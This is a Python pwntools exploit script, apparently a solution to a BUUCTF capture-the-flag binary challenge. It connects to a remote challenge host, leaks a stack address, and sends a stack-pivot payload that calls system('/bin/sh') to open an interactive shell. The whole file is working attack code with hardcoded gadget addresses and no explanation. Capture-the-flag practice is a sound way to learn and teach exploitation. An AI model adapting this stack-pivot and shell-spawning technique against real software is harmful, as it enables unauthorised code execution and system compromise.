from pwn import *
from LibcSearcher import *
context(log_level='debug', arch='i386')

if len(sys.argv) > 1:
  conn = remote('node4.buuoj.cn',25414)
else:
  conn = process(sys.argv[0][:-7])
  gdb.attach(conn, 'b *0x08048595')

# gadgets
hack = 0x0804854b
system = 0x08048400
flag = 0x080486c5
echo_flag = 0x080486c0
vuln = 0x08048595
leave_ret = 0x08048562

conn.recvuntil(b'your name?\n')
payload1 = cyclic(0x28 + 0x4) 
conn.send(payload1)
res = conn.recvline()
stack_addr = u32(res[-5:-1])
padding_addr = stack_addr - 0x50
print(f'stack_addr: {hex(padding_addr)}')
payload2 = p32(system) + p32(0) + p32(padding_addr + 0xc) +  b'/bin/sh'
payload2 = payload2.ljust(0x28, b'\x00') + p32(padding_addr-4) + p32(leave_ret)
conn.send(payload2)
conn.recv()

conn.interactive()
